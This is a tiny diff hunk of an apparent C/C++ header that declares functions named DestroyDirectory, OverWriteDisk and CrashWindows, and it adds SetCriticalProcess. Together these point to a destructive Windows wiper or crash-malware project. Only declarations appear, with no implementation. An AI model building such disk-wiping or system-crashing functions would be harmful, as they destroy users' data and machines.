@@ -5,4 +5,5 @@
 
 extern void DestroyDirectory(LPWSTR Directory);
 extern void OverWriteDisk();
+extern void SetCriticalProcess();
 extern void CrashWindows();
